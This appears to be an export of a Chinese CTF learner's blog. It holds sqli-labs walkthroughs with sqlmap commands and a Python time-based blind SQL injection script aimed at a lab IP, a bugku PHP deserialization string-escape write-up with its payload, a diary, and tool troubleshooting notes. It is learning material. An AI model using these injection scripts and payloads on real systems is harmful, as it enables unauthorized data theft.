<p>–dbms mysql   ：指定数据库系统为mysql绕过sqlmap的自动检测</p>
<p>-v 显示 等级（0-6）</p>
<p><strong>方法一 ：用sqlmap 按部就班的</strong> 来，最后一步的payload 为：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">sqlmap.py -u <span class="hljs-string">&quot;http://43.247.91.228:84/Less-8/?id=2&quot;</span> --dbms mysql --batch -v 1 --dump -D security -T<span class="hljs-built_in"> users </span>-C <span class="hljs-string">&quot;id,password,username&quot;</span><br></code></pre></td></tr></table></figure>

<p><strong>方法二： 用脚本进行 盲注</strong> </p>
<p>具体操作 参考 <a href="https://blog.csdn.net/wy_97/article/details/78169623">https://blog.csdn.net/wy_97/article/details/78169623</a> 的详细操作</p>
<p><strong>方法三： 完全可以按照之前方法慢慢来爆破</strong></p>
<h4 id="Less-9-基于时间的GET单引号盲注"><a href="#Less-9-基于时间的GET单引号盲注" class="headerlink" title="Less-9 (基于时间的GET单引号盲注)"></a>Less-9 (基于时间的GET单引号盲注)</h4><p>1，<strong>补充：时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</strong></p>
<p>2，手工注入实在是太麻烦，将手工注入整理一下写出一个脚本 让机器去注入</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>value =<span class="hljs-string">&quot;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@_.-&quot;</span><br><br><br>data=<span class="hljs-string">&quot;&quot;</span><br><br>url = <span class="hljs-string">&quot;http://43.247.91.228:84/Less-9/?id=1&#x27; and if((ascii(substr((&#123;0&#125; limit 3,1),&#123;1&#125;,1)) = &#x27;&#123;2&#125;&#x27;),sleep(3),NULL); %23&quot;</span><br><br><br><br>url_length=<span class="hljs-string">&quot;http://43.247.91.228:84/Less-9/?id=1&#x27; and if((length((&#123;0&#125; limit 3,1))=&#123;1&#125; ),sleep(3),NULL); %23&quot;</span><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_length</span>(<span class="hljs-params">payload</span>):</span><br><br><br><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br><br><br><br>        url= url_length.format(payload,n)<br><br><br><br>        print(url)<br><br><br><br>        <span class="hljs-keyword">if</span>(get_respone(url)):<br><br><br><br>            print(<span class="hljs-string">&quot;[+] length is &#123;0&#125;&quot;</span>.format(n))<br><br><br><br>            <span class="hljs-keyword">return</span> n<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">payload,value,length</span>):</span><br><br><br><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,length):<br><br><br><br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value :<br><br><br><br>            url_data = url.format(payload,n,ord(v))<br><br><br><br>            print(url_data)<br><br><br><br>            <span class="hljs-keyword">if</span>(get_respone(url_data)):<br><br><br><br>                <span class="hljs-keyword">global</span> data<br><br><br><br>                data=data+v<br><br><br><br>                print(<span class="hljs-string">&quot;[+] data is &#123;0&#125;&quot;</span>.format(data))<br><br><br><br>                <span class="hljs-keyword">break</span><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_respone</span>(<span class="hljs-params">url</span>):</span><br><br><br><br>    <span class="hljs-keyword">try</span>:<br><br><br><br>        html = requests.get(url,timeout=<span class="hljs-number">2</span>)<br><br><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><br><br><br>        print(<span class="hljs-string">&quot;......&quot;</span>)<br><br><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><br>databse_payload =<span class="hljs-string">&quot;select  table_name from information_schema.tables where table_schema = database()&quot;</span><br><br><br><br>get_data(databse_payload,value,get_length(databse_payload)+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p><strong>这个脚本你每次只能查询 一个内容，</strong></p>
<p><strong>需要不断改变 4，5，行中 limit x，1 的 x 的数字去查询，</strong></p>
<p><strong>也需要改变 database_payload 去查询不同的信息</strong></p>
<h4 id="Less-10-基于时间的双引号盲注"><a href="#Less-10-基于时间的双引号盲注" class="headerlink" title="Less-10 (基于时间的双引号盲注)"></a>Less-10 (基于时间的双引号盲注)</h4><p>1，只用将第9题中的单引号改为双引号，其他用脚本注入就好</p>
<p><strong>注意，在脚本的第 4，5中的所有的单引号都改为双引号</strong></p>
<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="sqlmap-post类型注入方法："><a href="#sqlmap-post类型注入方法：" class="headerlink" title="sqlmap post类型注入方法："></a>sqlmap post类型注入方法：</h1><p><strong><em>\</em>方法一：（“-r txt ”方式注入）**</strong></p>
<p>1，先用burp suite 抓包，保存为1.txt文件放在桌面上</p>
<p><img src="https://img-blog.csdnimg.cn/20190523221451758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>2，打开sqlmap</p>
<p>查询数据库名：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><code class="hljs taggerscript">python sqlmap.py -r &quot;c:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\H</span>P<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\1</span>.txt&quot; -p id --dbs<br></code></pre></td></tr></table></figure>

<p>注：-r表示加载一个文件，-p指定参数</p>
<p>之后对应选择输入 ： Y    N     Y</p>
<p>得到：<img src="https://img-blog.csdnimg.cn/20190523221840906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>之后查表：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><code class="hljs taggerscript">python2 sqlmap.py -r &quot;c:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\H</span>P<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\1</span>.txt&quot; -p id --D skctf_flag --tables<br></code></pre></td></tr></table></figure>

<p>查字段：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -r <span class="hljs-string">&quot;c:\Users\HP\Desktop\1.txt&quot;</span> -<span class="hljs-selector-tag">p</span> id --D database_name -T table_name --<span class="hljs-attribute">columns</span><br></code></pre></td></tr></table></figure>

<p>查内容：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><code class="hljs taggerscript">python2 sqlmap.py -r &quot;c:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\H</span>P<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\1</span>.txt&quot; -p id --D database_name -T table_name -C column_name --dump<br></code></pre></td></tr></table></figure>

<h5 id="此文大部分方法和内容转载于"><a href="#此文大部分方法和内容转载于" class="headerlink" title="此文大部分方法和内容转载于"></a>此文大部分方法和内容转载于</h5><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/89740401">https://blog.csdn.net/vhkjhwbs/article/details/89740401</a></p>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>Daily</title>
    <url>/2021/09/01/2021/x/q/</url>
    <content><![CDATA[<p>​    之后这篇文章就来记录一些日常了</p>
<h1 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h1><p>9.1</p>
<p>很开心啊，昨天发布的文章到今天就有90多个访问量</p>
<p>而且登上了csdn的php榜第25名！再接再厉！</p>
<p><img src="/2021/09/01/2021/x/q/image-20210901144059817.png" alt="image-20210901144059817"></p>
<p>9.2</p>
<p>没想到代码审计的文章能到第五名</p>
<p>真是意外</p>
<p>虽然浏览量不太高(emm,再接再励吧)</p>
<p><img src="/2021/09/01/2021/x/q/image-20210902180307061.png" alt="image-20210902180307061"></p>
<p>9.5</p>
<p>果然会忘记记录哈哈</p>
<p>最近发现题目都不太好理解</p>
<p>代码审计还是比较难啊，真的很想把强网杯那题看懂啊啊啊</p>
<p>9.24</p>
<p>日子过得好快啊</p>
<p>转眼间过了中秋</p>
<p>要到了国庆</p>
<p>不知道自己什么时候能在比赛中解出几道题目</p>
<h1 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h1><p>2.13</p>
<p>挺累的，烦心事和糟心事都挺多</p>
<p>每个人都有难念的经吧，希望自己负重前行的时候，能多点实力</p>
]]></content>
      <tags>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/11/05/2021/x/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>字符串逃逸</title>
    <url>/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p> 今天也是写了好多道web题，感觉bugku上的两题ssti有点坑，一直说我的pin是错的</p>
<p>咳咳，回到正题，写一下newphp题目，这题有关字符串反序列化逃逸</p>
<p><a href="https://www.cnblogs.com/c0d1/p/14900076.html">bugku-newphp - c0d1 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// php版本:5.4.44</span><br>header(<span class="hljs-string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $hint;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$hint</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hint = $hint;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;hint===<span class="hljs-string">&quot;hint.php&quot;</span>)<br>            @<span class="hljs-keyword">$this</span>-&gt;hint = base64_encode(file_get_contents(<span class="hljs-keyword">$this</span>-&gt;hint)); <br>        var_dump(<span class="hljs-keyword">$this</span>-&gt;hint);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;hint != <span class="hljs-string">&quot;╭(●｀∀´●)╯&quot;</span>) &#123; <br>            <span class="hljs-comment">//There&#x27;s a hint in ./hint.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;hint = <span class="hljs-string">&quot;╰(●’◡’●)╮&quot;</span>; <br>        &#125; <br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $username;<br>    <span class="hljs-keyword">public</span> $password;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username, $password</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = $username;<br>        <span class="hljs-keyword">$this</span>-&gt;password = $password;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">$data</span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> $tmp;<br>    $data = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $data);<br>    $tmp = $data;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> $tmp;<br>    $data = $tmp;<br>    $r = str_replace(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), $data);<br>    <span class="hljs-keyword">return</span> $r;<br>&#125;<br><br>$tmp = <span class="hljs-string">&quot;test&quot;</span>;<br>$username = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];<br>$password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>$a = serialize(<span class="hljs-keyword">new</span> User($username, $password));<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/flag/is&#x27;</span>,$a))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NoNoNo!&quot;</span>);<br><br>unserialize(read(write($a)));<br><br></code></pre></td></tr></table></figure>

<p>很容易通过代码审计知道，我们要通过触发evil类来达到访问hint.php的目的</p>
<p>但是evil类是没有传参数据的，所以需要触发User类来传递数据</p>
<p>绕开wakeup函数</p>
<p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028202324364.png" alt="image-20211028202324364"></p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;evil&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;hint.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>上面这段就是我们要注入的payload</p>
<p>用User类触发就是</p>
<p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211029182637091.png" alt="image-20211029182637091"></p>
<p>得到</p>
<p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211029182704445.png" alt="image-20211029182704445"></p>
<p>现在的问题就是，反序列化时字符长度固定的情况下，我们要怎么注入想要的属性</p>
<p>这时候我们要替换的就是”;s:8:”password”;s:41:”，总共23位</p>
<p>之前的read和write的方法会对字符串进行替换，而chr(0)*chr(0)s是三个字符，\0\0\0\是六个字符，</p>
<p>每增加一组的\0\0\0就会吞掉三个字符，即多出三个位置给后面。</p>
<p>我们可以在password的值上再加一个任意字符，即可凑齐24个，那么\0\0\0就是八组</p>
<p>那这样我们就可以尝试注入了</p>
<p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028203903753.png" alt="image-20211028203903753"></p>
<p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028203932607.png" alt="image-20211028203932607"></p>
<p>访问index.cgi</p>
<p>存在ssrf</p>
<p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028204012795.png" alt="image-20211028204012795"></p>
<p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028204157176.png" alt="image-20211028204157176"></p>
<h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了serialize函数之后，要是放在序列化之前应该就不会产生这个问题</p>
<p><a href="https://blog.csdn.net/dengyu810/article/details/103213750">https://blog.csdn.net/dengyu810/article/details/103213750</a></p>
<p>再来刚才那题，我为了验证下正确性，将username里的字符变成2倍，然后通过前面要替换为23位</p>
<p>就用24x2得到的48位减去23位得到25位，为了避免覆盖payload我们就增添25位</p>
<p>记住，这里是6-&gt;3，\0的2位替换成1位的*，所以计算的时候要注意，都是以被替换成后来计算的</p>
<p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211029185728645.png" alt="image-20211029185728645"></p>
<p>照样打得通</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>博客解疑</title>
    <url>/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/</url>
    <content><![CDATA[<h3 id="当输入hexo-g发布博文并预览时出现下面的提示："><a href="#当输入hexo-g发布博文并预览时出现下面的提示：" class="headerlink" title="当输入hexo -g发布博文并预览时出现下面的提示："></a>当输入hexo -g发布博文并预览时出现下面的提示：</h3><figure class="highlight fortran"><table><tr><td class="code"><pre><code class="hljs fortran">YAMLException: can not read a <span class="hljs-keyword">block</span> mapping <span class="hljs-built_in">entry</span>; a multiline key may not be an <span class="hljs-keyword">implicit</span> key at line x, column y:<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>报错信息是提示hexo的yml配置文件 冒号后面少了空格 解决方案：到提示行将对应的空格补上即可。</p>
<h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><p>如果标题用诸如[网鼎杯] 2020 青龙组AreUSerialz的时候，会出现报错</p>
<p>原因猜测为hexo标题默认加上了[ ],我们再次添加这个符号就会产生报错。</p>
<h3 id="hexo-s-时出现报错"><a href="#hexo-s-时出现报错" class="headerlink" title="hexo -s 时出现报错"></a>hexo -s 时出现报错</h3><p>Port 4000 has been used. Try other port instead.</p>
<p>分析了一下，应该是我恰巧同时使用PHP study和hexo静态页面，所以占用了端口，查找文章获得方法：</p>
<p>可以在站点下的文件_config.yml内加上如下代码更改hexo-server运行时的端口号：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">4001</span> <span class="hljs-comment">#端口号随意，默认是4000</span><br>  <span class="hljs-attr">compress:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">header:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>



<h3 id="About-photograph"><a href="#About-photograph" class="headerlink" title="About photograph"></a>About photograph</h3><p>今天再次尝试博客上传图片（好吧，都是因为之前自己不断失败，苦笑ing）</p>
<p>重新看了下csdn上一篇好文章</p>
<p>附上链接：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/xjm<span class="hljs-number">850552586</span>/article/details/<span class="hljs-number">84101345</span>?ops_request_misc=%<span class="hljs-number">25257</span>B%<span class="hljs-number">252522</span>request%<span class="hljs-number">25255</span>Fid%<span class="hljs-number">252522</span>%<span class="hljs-number">25253</span>A%<span class="hljs-number">252522161371871416780266219548</span>%<span class="hljs-number">252522</span>%<span class="hljs-number">25252</span>C%<span class="hljs-number">252522</span>scm%<span class="hljs-number">252522</span>%<span class="hljs-number">25253</span>A%<span class="hljs-number">25252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">252522</span>%<span class="hljs-number">25257</span>D&amp;request_id=<span class="hljs-number">161371871416780266219548</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~sobaiduend~default-<span class="hljs-number">1</span>-<span class="hljs-number">84101345</span>.pc_search_result_before_js&amp;utm_term=hexo%<span class="hljs-number">25</span>E<span class="hljs-number">5</span>%<span class="hljs-number">259</span>B%<span class="hljs-number">25</span>BE%<span class="hljs-number">25</span>E<span class="hljs-number">7</span>%<span class="hljs-number">2589</span>%<span class="hljs-number">2587</span><br><br><br></code></pre></td></tr></table></figure>

<p>之后本地只需在文件的相同名文件夹下保存图片，然后markdown编辑时直接添加图片即可啦。</p>
<p>注意：文章和同名文件夹需要在同一目录下，否则会显示丢失路径。</p>
<h3 id="burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法"><a href="#burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法" class="headerlink" title="burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法"></a>burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法</h3><p>如果点击start attrack 后出现 Payload set 1: Invalid number settings 的提示，先点hex 后点 decimal 再开始start attrack，这是一个软件bug，需要手动让它刷新。<br><img src="https://img-blog.csdnimg.cn/20190901085439370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190901085447734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="Python数据可视化利器Matplotlib，无法显示中文，怎么办？"><a href="#Python数据可视化利器Matplotlib，无法显示中文，怎么办？" class="headerlink" title="Python数据可视化利器Matplotlib，无法显示中文，怎么办？"></a>Python数据可视化利器Matplotlib，无法显示中文，怎么办？</h3><p><a href="https://zhuanlan.zhihu.com/p/104081310?utm_source=wechat_timeline">彻底解决Python里matplotlib不显示中文的问题 - 知乎 (zhihu.com)</a></p>
<p>在自己的代码里加入如下代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">import matplotlib<br>matplotlib.rc(&quot;font&quot;,family=&#x27;YouYuan&#x27;)<br></code></pre></td></tr></table></figure>

<p>解决<img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210527201252662.png" alt="image-20210527201252662"></p>
<h3 id="在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？"><a href="#在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？" class="headerlink" title="在使用phpstudy启动apache服务器时一直出现    PHP startup  弹窗怎么办？"></a>在使用phpstudy启动apache服务器时一直出现    PHP startup  弹窗怎么办？</h3><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111000310.png" alt="image-20210726111000310"></p>
<p>上网查找后得知，这于php.ini配制文件有关</p>
<p>1.对于里面的扩展文件，若目录下无文件需要用；加以关闭。</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111308665.png" alt="image-20210726111308665"></p>
<p>如图，这里的</p>
<p>extension=php_xmlrpc.dll在对应文件夹里并没有，所以我们加上分号来关闭。</p>
<p>2.路径的添加：</p>
<p>打开php.ini，如找到extension_dir修改为：</p>
<p><strong>extension_dir = “D:/Program/WAMP/php/ext”</strong></p>
<p>引号内使用绝对路径即可。</p>
<h3 id="Dirsearch的安装与使用"><a href="#Dirsearch的安装与使用" class="headerlink" title="Dirsearch的安装与使用"></a>Dirsearch的安装与使用</h3><p>记录一下啊，调试了好长一段时间才成功的扫描工具<strong>dirsearch</strong></p>
<p>总结运行成功的几个条件：</p>
<p>1.安装python版本3.7及以上，且要确保cmd命令行内默认版本正确（因为之前我为了使用GitHack而更改了python解释器）。</p>
<p>2.遇到如下报错时：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\dirsearch.py&quot;</span>, line <span class="hljs-number">28</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> lib.controller.controller <span class="hljs-keyword">import</span> Controller<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\controller\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> .controller <span class="hljs-keyword">import</span> Controller  <span class="hljs-comment"># noqa: F401</span><br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\controller\controller.py&quot;</span>, line <span class="hljs-number">29</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> lib.connection.requester <span class="hljs-keyword">import</span> Requester<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\connection\requester.py&quot;</span>, line <span class="hljs-number">30</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> thirdparty.requests_ntlm <span class="hljs-keyword">import</span> HttpNtlmAuth<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\thirdparty\requests_ntlm\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> .requests_ntlm <span class="hljs-keyword">import</span> HttpNtlmAuth<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\thirdparty\requests_ntlm\requests_ntlm.py&quot;</span>, line <span class="hljs-number">5</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> cryptography <span class="hljs-keyword">import</span> x509<br>ModuleNotFoundError: <span class="hljs-keyword">No</span> <span class="hljs-keyword">module</span> named <span class="hljs-string">&#x27;cryptography&#x27;</span><br></code></pre></td></tr></table></figure>

<p>说明库没装上，可以去pycharm里自行安装完整。</p>
<p>附上图:</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802195925831.png"></p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802200037618.png"></p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802200638164.png"></p>
<p>dirseach自带的字典在db目录下，使用格式以及常用参数如下：<br>py dirsearch.py<code>-</code>u [target url]<code>-</code>e<code>*</code></p>
<p><strong>-<code>u后面跟要扫的url</code></strong></p>
<p><strong>-<code>e是指定的url</code></strong></p>
<p><strong>-<code>w是指定字典</code></strong></p>
<p><strong>-<code>r递归目录</code></strong></p>
<p><strong>-<code>random</code>-agents使用随机UA</strong></p>
<p>还可以调低线程：*<em>dirsearch.py -u url -e * –timeout=2 -t 1 -x 400,403,404,500,503,429*</em></p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap -r后面跟着文件</p>
<p>sqlmap -u后面跟着路径（url）</p>
<p>sqlmap常用参数：<br>-u : 指定目标URL，sql注入点<br>–cookie : 当前会话的cookie值<br>-b : 获取数据库类型 检索数据库管理系统的标识<br>（DBMS：Database Management System 数据库管理系统）<br>–current-db : 获取当前数据库<br>–current-user :获取当前登录数据库使用的用户</p>
